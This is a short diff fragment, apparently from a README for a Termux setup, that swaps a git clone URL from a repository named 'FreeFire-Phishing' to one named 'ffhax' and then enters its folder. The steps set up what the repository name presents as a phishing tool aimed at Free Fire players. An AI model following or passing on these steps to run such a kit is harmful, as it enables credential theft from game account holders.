@@ -6,7 +6,7 @@ $ pkg install php
 
 $ pkg install git
 
-$ git clone https://github.com/whitehackereye/FreeFire-Phishing
+$ git clone https://github.com/mrdarkx/ffhax
 
 $ cd ffhax
 
